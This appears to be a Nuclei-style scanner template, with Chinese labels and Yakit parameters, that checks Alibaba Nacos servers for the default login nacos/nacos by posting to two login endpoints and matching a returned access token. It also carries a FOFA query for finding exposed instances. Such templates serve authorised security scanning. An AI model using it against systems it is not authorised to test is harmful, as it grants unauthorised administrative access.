script_name: Alibaba Nacos - 默认账号密码登录
content:
id: nacos-default-login

info:
  name: Alibaba Nacos - 默认账号密码登录
  severity: high
  description: |
    Nacos 默认账号密码.
  metadata:
    verified: true
    max-request: 2
    fofa-query: title=="Nacos"
  tags: nacos,default-login,alibaba

http:
  - raw:
      - |
        POST /v1/auth/users/login  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nacos-Server
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}
      - |
        POST /nacos/v1/auth/users/login  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nacos-Server
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - nacos
      password:
        - nacos
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"accessToken":'
          - '"username":'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
